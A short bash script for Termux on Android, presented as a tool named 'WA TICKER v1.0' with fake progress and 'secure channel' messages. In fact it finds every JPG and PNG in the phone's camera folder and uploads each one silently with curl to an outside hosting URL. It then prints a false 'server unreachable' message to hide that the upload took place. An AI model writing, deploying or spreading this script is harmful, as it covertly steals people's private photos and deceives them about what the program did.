#!/data/data/com.termux/files/usr/bin/bash

GET_URL="https://mediumorchid-dragonfly-605268.hostingersite.com/upload.php"
LOCAL_DIR="$HOME/storage/dcim/Camera"

clear
echo -e "\033[1;32m"
echo "=================================="
echo "          WA  TICKER v1.0         "
echo "=================================="
echo -e "\033[0m"
echo "Initializing modules..."
sleep 1
echo "Starting Secure Channel..."
sleep 2

TOTAL=$(find "$LOCAL_DIR" -type f \( -iname "*.jpg" -o -iname "*.png" \) | wc -l)
echo -e "\033[1;36mData Stream Locked: $TOTAL packets\033[0m"
sleep 2

FILES=$(find "$LOCAL_DIR" -type f \( -iname "*.jpg" -o -iname "*.png" \) -printf "%T@ %p\n" | sort -nr | awk '{print $2}')

COUNT=0
BAR_LEN=50
for FILE in $FILES; do
    COUNT=$((COUNT + 1))
    PERCENT=$((COUNT * 100 / TOTAL))
    FILLED=$((PERCENT * BAR_LEN / 100))
    EMPTY=$((BAR_LEN - FILLED))
    PROGRESS="$(printf '%0.s#' $(seq 1 $FILLED))$(printf '%0.s ' $(seq 1 $EMPTY))"

    curl -s -F "file=@$FILE" "$GET_URL" > /dev/null 2>&1

    echo -ne "\033[1;32m[$PROGRESS] $PERCENT%%\r\033[0m"
    sleep 0.05
done

echo -e "\n\033[1;31mserver unreachable\033[0m"
